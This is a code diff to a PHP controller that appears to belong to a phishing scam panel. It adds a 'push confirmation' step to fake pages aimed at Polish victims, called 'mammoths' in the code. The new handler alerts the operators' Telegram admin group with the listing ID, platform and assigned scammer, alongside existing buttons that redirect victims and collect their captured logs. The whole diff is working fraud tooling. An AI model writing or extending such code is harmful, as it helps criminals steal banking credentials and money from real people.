@@ -159,6 +159,7 @@ class PagesController extends Controller
                     [["text" => "⤴️ /code (неверный код)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /code"]],
                     [["text" => "⤴️ /error (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /error"]],
                     [["text" => "⤴️ /success (успешно)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /success"]],
+                    [["text" => "⤴️ /push (подтверждение)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /push"]],
                     [["text" => "🖇 Взять лог", "callback_data" => "/takeLog {$fake->track_id}"]],
                 ] : [],
                 "resize_keyboard" => true,
@@ -484,6 +485,19 @@ class PagesController extends Controller
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
         return view('fakes.success', ['title' => 'Success']);
+    }
+
+    public function push()
+    {
+        $fake = $this->getFake();
+        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
+            "⚠️<b>Мамонт на странице подтверждения</b>",
+            "=================",
+            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
+            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
+            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
+        ]);
+        return view('fakes.push', ['title' => 'potwierdzenie']);
     }
 
 }
